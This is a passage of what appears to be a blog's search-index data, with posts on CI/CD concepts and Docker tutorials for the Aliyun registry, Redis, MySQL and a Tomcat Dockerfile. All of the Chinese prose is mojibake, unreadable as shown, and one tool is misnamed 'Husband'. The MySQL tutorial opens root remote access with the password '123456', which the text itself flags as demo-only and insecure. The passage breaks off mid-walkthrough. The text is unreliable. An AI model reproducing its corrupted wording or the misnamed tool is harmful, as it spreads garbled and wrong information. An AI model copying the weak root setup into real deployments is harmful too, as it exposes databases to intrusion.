åˆ™ç”±ç”²éª¨æ–‡å…¬å¸ç»§ç»­ç®¡ç†ï¼Œæ‰€ä»¥äºŒè€…æ˜¯éå¸¸ç›¸ä¼¼çš„äº§å“ã€‚Jenkins å¯ä»¥æ•´åˆ Subversionã€Gitã€GitHub ç­‰ï¼Œè€Œ Husband åŒæ ·ä¹Ÿå¯ä»¥ã€‚å…¶ä»–ä¼˜ç§€çš„æŒç»­é›†æˆå·¥å…·è¿˜æœ‰ Striderã€GitLab CIã€TeamCityï¼ˆJetBrainsï¼‰ã€Travis CIã€Codeshipã€Codefresh ç­‰ã€‚ æŒç»­é›†æˆä»‹ç» é—®é¢˜ï¼šå„ä¸ªå°ç»„åˆ†åˆ«è´Ÿè´£å„ä¸ªå…·ä½“æ¨¡å—å¼€å‘ï¼Œæœ¬æ¨¡å—ç‹¬ç«‹æµ‹è¯•è™½ç„¶èƒ½å¤Ÿé€šè¿‡ï¼Œä½†æ˜¯ä¸Šçº¿å‰å¤•å°†æ‰€æœ‰æ¨¡å—æ•´åˆåˆ°ä¸€èµ·é›†æˆæµ‹è¯•å´å‘ç°å­˜åœ¨å¾ˆå¤šé—®é¢˜ï¼Œæƒ³è¦è§£å†³å°±éœ€è¦æŠŠå¾ˆå¤šä»£ç è¿”å·¥é‡å†™è€Œä¸”ä»ç„¶æœ‰å¯èƒ½æœ‰é—®é¢˜ï¼Œä½†ç°åœ¨æ—¶é—´å¾ˆå¯èƒ½ä¸å¤Ÿäº†ã€‚é‚£æ€ä¹ˆåšä¼šå¥½ä¸€äº›å‘¢ï¼Ÿ æ¦‚å¿µï¼šContinuous Integrationï¼ˆCIï¼‰æŒç»­é›†æˆæŒ‡å¼€å‘äººå‘˜æäº¤äº†æ–°ä»£ç ä¹‹åï¼Œç«‹åˆ»è¿›è¡Œæ„å»ºã€è‡ªåŠ¨åŒ–æµ‹è¯•ã€‚æ ¹æ®æµ‹è¯•ç»“æœï¼Œç¡®å®šæ‰€æœ‰æ¨¡å—çš„ä»£ç æ˜¯å¦èƒ½æ­£ç¡®åœ°é›†æˆåœ¨ä¸€èµ·ï¼›å¦‚æœå¤±è´¥ï¼Œå¼€å‘å›¢é˜Ÿå°±è¦åœä¸‹æ‰‹ä¸­çš„å·¥ä½œç«‹å³ä¿®å¤å®ƒã€‚Martin Fowler è¯´è¿‡ï¼šâ€ æŒç»­é›†æˆå¹¶ä¸èƒ½æ¶ˆé™¤ Bugï¼Œè€Œæ˜¯è®©å®ƒä»¬éå¸¸å®¹æ˜“å‘ç°å’Œæ”¹æ­£ã€‚â€ å…³æ³¨ç‚¹ï¼šæŒç»­é›†æˆçš„å…³æ³¨ç‚¹åœ¨äºå°½æ—©å‘ç°é¡¹ç›®æ•´ä½“è¿è¡Œå­˜åœ¨çš„é—®é¢˜ï¼Œå¹¶å°½æ—©è§£å†³ã€‚ æŒç»­äº¤ä»˜ä»‹ç» é—®é¢˜ï¼šé¡¹ç›®çš„å„ä¸ªå‡çº§ç‰ˆæœ¬ä¹‹é—´é—´éš”æ—¶é—´å¤ªé•¿ï¼Œå¯¹ç”¨æˆ·åé¦ˆæ„ŸçŸ¥è¿Ÿé’ï¼Œæ— æ³•ç²¾ç¡®æ”¹å–„ç”¨æˆ·ä½“éªŒï¼Œç”¨æˆ·æµå¤±ä¸¥é‡ã€‚é‚£æ€ä¹ˆåšä¼šå¥½ä¸€äº›å‘¢ï¼Ÿ æ¦‚å¿µï¼šContinuous Delivery (CD) æŒç»­äº¤ä»˜å»ºç«‹åœ¨æŒç»­é›†æˆçš„åŸºç¡€ä¸Šï¼ŒæŒ‡å°†é›†æˆåçš„ä»£ç éƒ¨ç½²åˆ°æ›´è´´è¿‘çœŸå®è¿è¡Œç¯å¢ƒçš„ã€Œç±»ç”Ÿäº§ç¯å¢ƒã€ï¼Œç¡®ä¿å¯ä»¥ä»¥å¯æŒç»­çš„æ–¹å¼å¿«é€Ÿå‘è´¨é‡å›¢é˜Ÿæˆ–è€…ç”¨æˆ·å‘å¸ƒæ–°ç‰ˆæœ¬ï¼›åŒæ—¶ä¸æ–­æ”¶é›†ç”¨æˆ·åé¦ˆçš„ä¿¡æ¯ï¼Œç”¨æœ€å¿«çš„é€Ÿåº¦æ”¹è¿›ä¼˜åŒ–ã€‚å¦‚æœä»£ç æ²¡æœ‰é—®é¢˜ï¼Œä¸‹ä¸€æ­¥å¯ä»¥ç»§ç»­éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒä¸­ã€‚ å…³æ³¨ç‚¹ï¼šæŒç»­äº¤ä»˜çš„å…³æ³¨ç‚¹åœ¨äºç ”å‘å›¢é˜Ÿçš„æœ€æ–°ä»£ç èƒ½å¤Ÿå°½å¿«è®©æœ€ç»ˆç”¨æˆ·ä½“éªŒåˆ°ã€‚ æŒç»­éƒ¨ç½²ä»‹ç» é—®é¢˜ï¼šå¼€å‘è¿‡ç¨‹ä¸­è¿›è¡Œå•å…ƒæµ‹è¯•èƒ½å¤Ÿé€šè¿‡ï¼Œä½†æ˜¯éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šè¿è¡Œå‡ºç°é—®é¢˜ã€‚ä»…ä»…å•å…ƒæµ‹è¯•è¿˜ä¸å¤Ÿï¼Œå„ä¸ªæ¨¡å—éƒ½å¿…é¡»èƒ½å¤Ÿåœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œã€‚é‚£æ€ä¹ˆåšä¼šå¥½ä¸€äº›å‘¢ï¼Ÿ æ¦‚å¿µï¼šContinuous Deploymentï¼ˆCDï¼‰æŒç»­éƒ¨ç½²å»ºç«‹åœ¨æŒç»­äº¤ä»˜çš„åŸºç¡€ä¸Šï¼ŒæŒ‡ä»£ç é€šè¿‡è¯„å®¡ä¹‹åï¼ŒæŠŠéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒçš„è¿‡ç¨‹è‡ªåŠ¨åŒ–ï¼Œå‰ææ˜¯èƒ½è‡ªåŠ¨åŒ–å®Œæˆæ„å»ºã€æµ‹è¯•ã€éƒ¨ç½²ç­‰æ­¥éª¤ã€‚ å…³æ³¨ç‚¹ï¼šæŒç»­éƒ¨ç½²çš„å…³æ³¨ç‚¹åœ¨äºä»£ç åœ¨ä»»ä½•æ—¶åˆ»éƒ½æ˜¯å¯ä»¥éƒ¨ç½²å’Œè¿›å…¥ç”Ÿäº§é˜¶æ®µçš„ï¼Œä¸ºä¸‹ä¸€æ­¥æµ‹è¯•ç¯èŠ‚æˆ–æœ€ç»ˆç”¨æˆ·æ­£å¼ä½¿ç”¨åšå¥½å‡†å¤‡ã€‚ CI/CD å·¥ä½œæµç¨‹å›¾ GitOps å·¥ä½œæµç¨‹å›¾ å‚è€ƒèµ„æ–™ ä»€ä¹ˆæ˜¯ CI/CDï¼Ÿ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ci/cd"},{title:"Docker ä¹‹åäºŒå¯è§†åŒ–ç®¡ç†å·¥å…·ä»‹ç»",url:"/posts/91f8692e.html",text:'ä¸»æµçš„ Docker å¯è§†åŒ–ç®¡ç†å·¥å…· docker uiã€shipyardã€portainer var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Docker ä¹‹åä¸€å®æˆ˜ Push é•œåƒåˆ°é˜¿é‡Œäº‘é•œåƒä»“åº“",url:"/posts/8496a43e.html",text:'è®¾ç½® Registry ç™»å½•å¯†ç  åˆ›å»ºå‘½åç©ºé—´ åˆ›å»ºé•œåƒä»“åº“ï¼ˆæœ¬åœ°ï¼‰ å°†æœ¬åœ°é•œåƒæ¨é€åˆ°é•œåƒä»“åº“ 123456789101112131415161718# åœ¨ä¸‹é¢çš„æ“ä½œä¸­ï¼Œé“¾æ¥registry.cn-shenzhen.aliyuncs.comå¯ä»¥ä»é˜¿é‡Œäº‘çš„é•œåƒä»“åº“ç®¡ç†é¡µé¢è·å–# ç™»å½•é˜¿é‡Œäº‘Docker Registryï¼ŒæˆåŠŸåå¸å·ä¿¡æ¯é»˜è®¤å­˜æ”¾åœ¨ ~/.docker/config.json# docker login --username=[ç”¨æˆ·å] registry.cn-shenzhen.aliyuncs.com# tagå‘½ä»¤å®˜æ–¹è¯­æ³•: docker tag SOURCE_IMAGE[:TAG] TARGET_IMAGE[:TAG]# tagå‘½ä»¤å®˜æ–¹è§£é‡Šï¼š Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE# åˆ›å»ºç›®æ ‡é•œåƒï¼Œå…¶ä¸­peter-docker-studyæ˜¯å‘½åç©ºé—´ï¼Œcentos-testæ˜¯ä»“åº“åç§°# docker tag [é•œåƒID] registry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test:[é•œåƒç‰ˆæœ¬å·]# æŸ¥çœ‹æœ¬åœ°é•œåƒ# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEregistry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test [é•œåƒç‰ˆæœ¬å·] [é•œåƒID] 1 hours ago 385MB# å°†æœ¬åœ°é•œåƒPushåˆ°é˜¿é‡Œäº‘é•œåƒä»“åº“# docker push registry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test:[é•œåƒç‰ˆæœ¬å·] ä»é•œåƒä»“åº“æ‹‰å–é•œåƒåˆ°æœ¬åœ° 12345678910# æ‹‰å–é•œåƒåˆ°æœ¬åœ°ï¼Œå…¶ä¸­peter-docker-studyæ˜¯å‘½åç©ºé—´ï¼Œcentos-testæ˜¯ä»“åº“åç§°# docker pull registry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test:[é•œåƒç‰ˆæœ¬å·]# æŸ¥çœ‹æœ¬åœ°é•œåƒ# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEregistry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test [é•œåƒç‰ˆæœ¬å·] [é•œåƒID] 1 hours ago 385MB# ä»¥äº¤äº’å¼è¿è¡ŒPullä¸‹æ¥çš„Dockeré•œåƒ# docker run -it --name=â€œpeter-centosâ€ registry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test:[é•œåƒç‰ˆæœ¬å·] var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Docker ä¹‹åå®æˆ˜ä½¿ç”¨ Docker å®˜æ–¹çš„ Redis é•œåƒ",url:"/posts/f13cae46.html",text:'Docker å®˜æ–¹ Redis é•œåƒçš„ä½¿ç”¨è¯´æ˜æ–‡æ¡£ https://hub.docker.com/_/redis ä½¿ç”¨ Docker å®˜æ–¹çš„ Redis é•œåƒ 1234567891011121314151617181920212223242526272829303132333435363738394041424344# æœç´¢æ‰€æœ‰å¯ç”¨çš„Redisé•œåƒ# docker search redis# ä¸‹è½½Dockerå®˜æ–¹æä¾›çš„Redis5.0é•œåƒï¼ˆåŸºäºDebian-Stretchï¼‰# docker pull redis:5.0# åˆ›å»ºå¹¶å¯åŠ¨ï¼ˆä»¥åå°æ–¹å¼ï¼‰Rediså®¹å™¨ï¼ŒåŒæ—¶æŒ‚è½½Redisçš„æ•°æ®æ–‡ä»¶ç›®å½•å’Œå¯ç”¨AOF# docker run -p 6379:6379 --name redis5.0 \\ -v /container/redis5.0/data:/data \\ -d redis:5.0 redis-server --appendonly yes# æˆ–è€…æŒ‡å®šRedisçš„é…ç½®æ–‡ä»¶ç›®å½•æ¥å¯åŠ¨Rediså®¹å™¨# docker run -p 6379:6379 --name redis5.0 \\ -v /container/redis5.0/conf/redis.conf:/usr/local/etc/redis/redis.conf \\ -v /container/redis5.0/data:/data \\ -d redis:5.0 redis-server /usr/local/etc/redis/redis.conf# æ³¨æ„ï¼š# ä¸Šé¢çš„/container/redis5.0/conf/redis.confæ˜¯Redisçš„é…ç½®æ–‡ä»¶ç›®å½•ï¼ˆéé…ç½®æ–‡ä»¶æœ¬èº«ï¼‰ï¼Œåº”è¯¥åœ¨æ­¤ç›®å½•ä¸‹é¢„å…ˆæ·»åŠ ReidsçœŸæ­£çš„é…ç½®æ–‡ä»¶redis.confï¼Œç„¶åå†å¯åŠ¨Rediså®¹å™¨# å¦‚æœæŒ‡å®šReidsé…ç½®æ–‡ä»¶ç›®å½•æ¥å¯åŠ¨Rediså®¹å™¨ï¼Œé‚£é…ç½®æ–‡ä»¶redis.confé‡Œåº”è¯¥æ³¨é‡Šæ‰"bind"ç›¸å…³é…ç½®é¡¹# æŒ‡å®šRedisçš„é…ç½®æ–‡ä»¶ç›®å½•æ¥å¯åŠ¨Rediså®¹å™¨ï¼Œå¹¶æ·»åŠ Redisçš„é…ç½®æ–‡ä»¶ï¼Œæœ€ç»ˆå®¿ä¸»æœºå…±äº«ç›®å½•çš„ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š/containerâ””â”€â”€ redis5.0 â”œâ”€â”€ conf â”‚&nbsp;&nbsp; â””â”€â”€ redis.conf â”‚&nbsp;&nbsp; â””â”€â”€ redis.conf â””â”€â”€ data# æŸ¥çœ‹å½“å‰æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESdbe17690112d redis:5.0 "docker-entrypoint.sâ€¦" 3 minutes ago Up 3 minutes 0.0.0.0:6379-&gt;6379/tcp redis5.0# è¿æ¥åˆ°Dockerå®¹å™¨ï¼Œè¿æ¥ä¹‹åå¦‚æœæƒ³æ–­å¼€è¿æ¥ï¼Œåœ¨å®¹å™¨å†…çš„ç»ˆç«¯ç›´æ¥æ‰§è¡Œ"exit"å‘½ä»¤å³å¯ï¼Œè¿æ¥æ–­å¼€åå®¹å™¨ä¸ä¼šåœæ­¢è¿è¡Œ# docker exec -it redis5.0 /bin/bash# åœ¨å®¹å™¨å†…ï¼Œè¿æ¥åˆ°RedisæœåŠ¡å™¨# redis-cli -p 6379# æç¤ºï¼šReidsç›¸å…³æ–‡ä»¶ç›®å½•è¯´æ˜# é»˜è®¤æ•°æ®æ–‡ä»¶ç›®å½•ï¼š/data# é»˜è®¤å®‰è£…ç›®å½•ï¼š/usr/local/bin/# é»˜è®¤æ—¥å¿—æ–‡ä»¶ï¼šåœ¨é…ç½®æ–‡ä»¶redis.confä¸­æŒ‡å®š# é»˜è®¤é…ç½®æ–‡ä»¶ï¼šå¯åŠ¨Rediså®¹å™¨çš„æ—¶å€™ï¼Œå¦‚æœä¸æŒ‡å®šRedisçš„é…ç½®æ–‡ä»¶ç›®å½•ï¼Œåˆ™å®¹å™¨å†…ä½¿ç”¨é»˜è®¤å‚æ•°å¯åŠ¨RedisæœåŠ¡ï¼ˆå³æ­¤æ—¶ä¸å­˜åœ¨é»˜è®¤çš„Reidsé…ç½®æ–‡ä»¶ï¼‰ éªŒè¯ Redis æœåŠ¡å™¨æ˜¯å¦å¯ç”¨ 1234567891011121314# åœ¨å®¿ä¸»æœºä¸Šï¼Œä½¿ç”¨å®¹å™¨å†…çš„redis-cliå·¥å…·è¿æ¥åˆ°çš„RedisæœåŠ¡å™¨# docker exec -it redis5.0 redis-cli# æˆ–è€…åœ¨å®¿ä¸»æœºä¸Šï¼Œä½¿ç”¨å®¹å™¨å†…çš„redis-cliå·¥å…·è¿æ¥åˆ°çš„RedisæœåŠ¡å™¨ï¼Œå¹¶æŒ‡å®šRedisæœåŠ¡ç›‘å¬çš„ç«¯å£# docker exec -it redis5.0 redis-cli -p 6379# è®¾ç½®Key127.0.0.1:6379&gt; set key1 helloworld# è·å–Key127.0.0.1:6379&gt; get key1# é€€å‡ºRedisç™»å½•127.0.0.1:6379&gt; exit var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ– ç¼“å­˜"},{title:"Docker ä¹‹ä¹å®æˆ˜ä½¿ç”¨ Docker å®˜æ–¹çš„ MySQL é•œåƒ",url:"/posts/8605ce00.html",text:'Docker å®˜æ–¹ MySQL é•œåƒçš„ä½¿ç”¨è¯´æ˜æ–‡æ¡£ https://hub.docker.com/_/mysql ä½¿ç”¨ Docker å®˜æ–¹çš„ MySQL é•œåƒ ç³»ç»Ÿæ—¶åŒºè®¾ç½®ï¼š-e TZ=Asia/Shanghai æ•°æ®åº“å¯†ç è®¾ç½®ï¼š-e MYSQL_ROOT_PASSWORD=123456 1234567891011121314151617181920212223242526272829303132333435# æœç´¢æ‰€æœ‰å¯ç”¨çš„MySQLé•œåƒ# docker search mysql# ä¸‹è½½Dockerå®˜æ–¹æä¾›çš„MySQL5.7é•œåƒï¼ˆåŸºäºDebian-Stretchï¼‰# docker pull mysql:5.7# åˆ›å»ºå¹¶å¯åŠ¨ï¼ˆä»¥åå°æ–¹å¼ï¼‰MySQLå®¹å™¨ï¼ŒåŒæ—¶æŒ‚è½½MySQLçš„æ•°æ®æ–‡ä»¶ç›®å½•# docker run -p 3308:3306 --name mysql5.7 \\ -v /container/mysql5.7/data:/var/lib/mysql \\ -e MYSQL_ROOT_PASSWORD=123456 \\ -e TZ=Asia/Shanghai \\ -d mysql:5.7# æˆ–è€…æŒ‚è½½MySQLçš„é…ç½®æ–‡ä»¶ç›®å½•ã€æ•°æ®æ–‡ä»¶ç›®å½•ã€æ—¥å¿—æ–‡ä»¶ç›®å½•# docker run -p 3308:3306 --name mysql5.7 \\ -v /container/mysql5.7/conf:/etc/mysql/conf.d \\ -v /container/mysql5.7/data:/var/lib/mysql \\ -v /container/mysql5.7/logs:/var/log/mysql \\ -e MYSQL_ROOT_PASSWORD=123456 \\ -e TZ=Asia/Shanghai \\ -d mysql:5.7# æŸ¥çœ‹å½“å‰æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES7485feae5c64 mysql:5.7 "docker-entrypoint.sâ€¦" 7 seconds ago Up 5 seconds 33060/tcp, 0.0.0.0:3308-&gt;3306/tcp mysql5.7# è¿æ¥åˆ°Dockerå®¹å™¨ï¼Œè¿æ¥ä¹‹åå¦‚æœæƒ³æ–­å¼€è¿æ¥ï¼Œåœ¨å®¹å™¨å†…çš„ç»ˆç«¯ç›´æ¥æ‰§è¡Œ"exit"å‘½ä»¤å³å¯ï¼Œè¿æ¥æ–­å¼€åå®¹å™¨ä¸ä¼šåœæ­¢è¿è¡Œ# docker exec -it mysql5.7 /bin/bash# MySQLç›¸å…³æ–‡ä»¶ç›®å½•è¯´æ˜ï¼š# é»˜è®¤æ—¥å¿—æ–‡ä»¶ç›®å½•ï¼š/var/log/mysql# é»˜è®¤æ•°æ®æ–‡ä»¶ç›®å½•ï¼š/var/lib/mysql# é»˜è®¤é…ç½®æ–‡ä»¶è·¯å¾„ï¼š/etc/mysql/my.cnf# åŒæ—¶é»˜è®¤é…ç½®æ–‡ä»¶my.cnfä¼šåˆ†åˆ«åŠ è½½/etc/mysql/conf.d å’Œ /etc/mysql/mysql.conf.dç›®å½•ä¸‹çš„è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ éªŒè¯ MySQL æœåŠ¡å™¨æ˜¯å¦å¯ç”¨ 1234567891011121314151617181920212223# åœ¨å®¹å™¨å†…æ‰§è¡Œç™»å½•MySQLæœåŠ¡å™¨çš„å‘½ä»¤# docker exec -it mysql5.7 mysql -h localhost -u root -p# åˆ›å»ºæ•°æ®åº“mysql&gt; create database bbs default character set utf8;# åˆ›å»ºè¡¨mysql&gt; create table bbs.user(id bigint(20) not null auto_increment primary key, name varchar(25) not null) engine=innodb auto_increment=3 default charset=utf8;# æ’å…¥è¡¨æ•°æ®mysql&gt; insert into bbs.user(name) values("peter");# æŸ¥è¯¢è¡¨æ•°æ®mysql&gt; select * from bbs.user;+----+-------+| id | name |+----+-------+| 3 | peter |+----+-------+1 row in set (0.00 sec)# é€€å‡ºç™»å½•mysql&gt; exit å¼€å¯ MySQL è¿œç¨‹è®¿é—®çš„æƒé™ï¼ˆä»…ä¾›æ¼”ç¤ºï¼Œå‡ºäºæ•°æ®åº“å®‰å…¨è€ƒè™‘ï¼Œå¼ºçƒˆä¸å»ºè®®å¼€å¯ root ç”¨æˆ·çš„è¿œç¨‹è®¿é—®æƒé™ï¼‰ 12345678910111213141516171819# åœ¨å®¹å™¨å†…æ‰§è¡Œç™»å½•MySQLæœåŠ¡å™¨çš„å‘½ä»¤# docker exec -it mysql5.7 mysql -h localhost -u root -p# åˆ‡æ¢æ•°æ®åº“mysql&gt; use mysql;# ç”¨æˆ·æˆæƒmysql&gt; grant all privileges on *.* to root@\'%\' identified by "123456";# æ›´æ–°æˆæƒä¿¡æ¯mysql&gt; flush privileges;# é€€å‡ºç™»å½•mysql&gt; exit# å¦‚æœä»¥åæƒ³åœ¨å®¿ä¸»æœºä¸Šæˆ–è€…å¤–éƒ¨é€šè¿‡MySQLå®¢æˆ·ç«¯è¿æ¥åˆ°Dockerå®¹å™¨å†…çš„MySQLæœåŠ¡å™¨ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å³å¯ï¼›å…¶ä¸­192.168.1.198æ˜¯Dockerå®¹å™¨æ‰€åœ¨å®¿ä¸»æœºçš„IPï¼Œ3308æ˜¯å®¿ä¸»æœºçš„MySQLæ˜ å°„ç«¯å£# mysql -h 192.168.1.198 -u root -P 3308 -p# å®ŒæˆMySQLæˆæƒåï¼Œå¦‚æœå¤–éƒ¨ä¾ç„¶æ— æ³•è¿æ¥Dockerå®¹å™¨å†…çš„MySQLæœåŠ¡å™¨ï¼ŒåŠ¡å¿…æ£€æŸ¥å®¿ä¸»æœºçš„é˜²ç«å¢™æ˜¯å¦å¼€æ”¾äº†MySQLçš„æ˜ å°„ç«¯å£ï¼ˆå¦‚ä¸Šé¢çš„3308ç«¯å£ï¼‰ å¤‡ä»½ MySQL æ•°æ®åº“çš„æ•°æ® 12# å¤‡ä»½MySQLæ‰€æœ‰æ•°æ®åº“çš„æ•°æ®# docker exec mysql5.7 sh -c \'exec mysqldump --all-databases -uroot -p"123456"\'&gt; ~/all-databases.sql æŸ¥çœ‹ MySQL çš„æ—¥å¿—ä¿¡æ¯ 1234567# æ˜¾ç¤ºæ‰€æœ‰æ—¥å¿—ä¿¡æ¯# docker logs mysql5.7# è·Ÿè¸ªæ˜¾ç¤ºæ—¥å¿—ä¿¡æ¯# docker logs -t -f --tail 5 mysql5.7# æˆ–è€…è¿›å…¥MySQLå®¹å™¨å†…çš„æ—¥å¿—ç›®å½•/var/log/mysqlï¼Œè¿›ä¸€æ­¥åˆ†ææ—¥å¿—ä¿¡æ¯ æ›´æ”¹ç³»ç»Ÿçš„é•œåƒæºåœ°å€ï¼ŒåŸºäº Debian 9ï¼ˆStretchï¼‰ 123456789101112131415161718# è¿æ¥åˆ°Dockerå®¹å™¨ï¼Œè¿æ¥ä¹‹åå¦‚æœæƒ³æ–­å¼€è¿æ¥ï¼Œåœ¨å®¹å™¨å†…çš„ç»ˆç«¯ç›´æ¥æ‰§è¡Œ"exit"å‘½ä»¤å³å¯ï¼Œè¿æ¥æ–­å¼€åå®¹å™¨ä¸ä¼šåœæ­¢è¿è¡Œ# docker exec -it mysql5.7 /bin/bash# ä½¿ç”¨é˜¿é‡Œäº‘é•œåƒç«™# cp /etc/apt/sources.list /etc/apt/backup.sources.list# echo "deb http://mirrors.aliyun.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.list# echo "deb http://mirrors.aliyun.com/debian-security stretch/updates main" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list# æ›´æ–°è½¯ä»¶ç´¢å¼•# apt-get update# å‡çº§ç³»ç»Ÿï¼ˆéå¿…é¡»ï¼‰# apt-get upgrade# å®‰è£…è½¯ä»¶ï¼ˆéå¿…é¡»ï¼‰# apt-get -y install vim htop net-tools var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Docker ä¹‹å…«å®æˆ˜æ„å»º Tomcat æœåŠ¡å™¨çš„ Docker é•œåƒ",url:"/posts/79ba4cd.html",text:'å®æˆ˜å†…å®¹ä»‹ç» ç¼–å†™ Dockerfile æ–‡ä»¶ï¼ŒæŒ‡å®šç»ˆç«¯ç™»å½•åçš„é»˜è®¤è·¯å¾„ï¼Œå®‰è£… vimã€ifconfigã€jdkã€tomcatï¼Œå¹¶é…ç½® jdk ä¸ tomcat çš„ç¯å¢ƒå˜é‡ï¼Œæœ€åé€šè¿‡ Dockerfile æ–‡ä»¶æ„å»ºæ–°çš„ Docker é•œåƒï¼ˆåŸºäº Centosï¼‰å¹¶è¿è¡Œã€‚ ç›®å½•ç»“æ„ä»‹ç» 123456# åç»­æ‰€æœ‰æ“ä½œéƒ½åœ¨/root/build-tomcatç›®å½•ä¸‹è¿›è¡Œ# tree /root/build-tomcat/root/build-tomcatâ”œâ”€â”€ apache-tomcat-7.0.77.tar.gzâ”œâ”€â”€ dockerfile-tomcatâ””â”€â”€ jdk1.8.0_201.tar.gz ç¼–å†™ Dockerfile æ–‡ä»¶ 1234567891011121314151617181920212223242526272829FROM centosMAINTAINER peter&lt;peter@gmail.com&gt;ADD apache-tomcat-7.0.77.tar.gz /usr/localADD jdk1.8.0_201.tar.gz /usr/localRUN yum -y updateRUN yum -y install vim net-toolsENV work_path /usr/localWORKDIR $work_path# JavaENV JAVA_HOME /usr/local/jdk1.8.0_201ENV JRE_HOME /usr/local/jdk1.8.0_201/jreENV CLASSPATH .:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib# TomcatENV CATALINA_HOME /usr/local/apache-tomcat-7.0.77ENV CATALINA_BASE /usr/local/apache-tomcat-7.0.77ENV PATH $PATH:$JAVA_HOME/bin:$JRE_HOME/bin:$CATALINA_HOME/binEXPOSE 8080# ENTRYPOINT ["/usr/local/apache-tomcat-7.0.77/bin/startup.sh"]# CMD ["/usr/local/apache-tomcat-7.0.77/bin/catalina.sh", "run"]CMD /usr/local/apache-tomcat-7.0.77/bin/startup.sh &amp;&amp; tail -f /usr/local/apache-tomcat-7.0.77/logs/catalina.out æ„å»ºæ–°çš„ Docker é•œåƒ 1234567891011# ä¸‹è½½Centosæœ€æ–°çš„Dockeré•œåƒ# docker pull centos# è¿›å…¥æ„å»ºç›®å½•# cd /root/build-tomcat# åˆ›å»ºDockerfileæ–‡ä»¶ï¼Œå¹¶å†™å…¥ä¸Šè¿°çš„é…ç½®å†…å®¹# vi dockerfile-tomcat# 